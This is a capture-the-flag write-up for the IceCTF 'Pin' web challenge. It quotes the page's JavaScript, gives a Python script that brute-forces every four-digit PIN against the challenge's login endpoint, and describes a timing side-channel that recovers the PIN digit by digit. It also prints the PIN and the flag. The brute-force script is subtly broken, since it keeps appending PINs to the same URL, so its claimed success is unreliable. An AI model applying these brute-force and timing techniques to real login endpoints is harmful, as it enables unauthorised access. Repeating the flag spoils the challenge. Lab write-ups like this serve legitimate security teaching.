## Pin (Web)

> You are late again, and just can't remember the PIN code to the locker that has the secret Novichok stuff you need for work. What do you do?

We are given a website where we can enter a pin: 

![pin1](https://i.imgur.com/6OHV1IG.png)

After entering a pin, we can see that the response time is returned.

Looking at the source code, we see a file ``pin.js``.

Here is the interesting part of the code:

```
  handleSubmit(e) {
    // YV
    e.preventDefault();
    const digit = e.target.innerHTML;
    const newEntered = this.state.entered + digit;

    this.setState(state => ({ placedwords: state.placedwords + 1, entered: newEntered, time: null }));

    console.log('entered: ' + newEntered);

    if (newEntered.length >= 4) {
       fetch ('/login/'+newEntered)
       .then(results => {
       		return results.json();
       }).then((data) => {
       		//let time = data.get('time');
		this.setState({ response: data, time: data.time, flag: data.flag });
		//console.log('woot');
		console.log(this.state.response);
		console.log(this.state.time);
		console.log(this.state.flag);
		if (data.correct == true) {
		    console.log('flag is ' + data.flag);
		    //window.sendMessage({event: "flag", flag: data.flag });
		}
       }).catch (err => { console.log(err);});
    }
  }
}
```

We can see that whenever we input a pin, it is sent to ``/login/pin`` and json data is returned. This data contains whether the flag is correct, the flag if correct, and the time it took to check the pin.

From here, there are two different solutions.

### Solution 1 - Brute Force

Since we can easily access the endpoint, we can easily write a script to check each and every pin (0000-9999) to get the flag.

```python
#http://www.misc-pin.vuln.icec.tf/login/2222
import requests

url = "http://www.misc-pin.vuln.icec.tf/login/"
num = 1

for i in range(0, 10000):
	url = url + str(i).zfill(4)
	r=requests.get(url)
	data = r.json()
	if data["correct"]:
		print(r.text)
		exit(1)
	else:
		print("Pin " + str(i).zfill(4) + " " + str(data['time']))
	num+=1
	print(r.text)
```

Using this, we can easily find the pin to be ``1729``.

```
http://www.misc-pin.vuln.icec.tf/login/1729

{"correct":true,"flag":"IceCTF{t1mIng_r3al1y_is_everyth1ng_isNt_it}","time":1432}
```

> IceCTF{t1mIng_r3al1y_is_everyth1ng_isNt_it}


### Method 2 - Timing

Whenever a pin is entered, we can see the response time. Whenever the first number was 1, I noticed the response takes longer (1200 compared to 1100). Whenever the second number is 7, the response time is 1300. Using this logic, I found the pin to be 1729.

![pinsolution](https://i.imgur.com/58UMsDx.png)

> IceCTF{t1mIng_r3al1y_is_everyth1ng_isNt_it}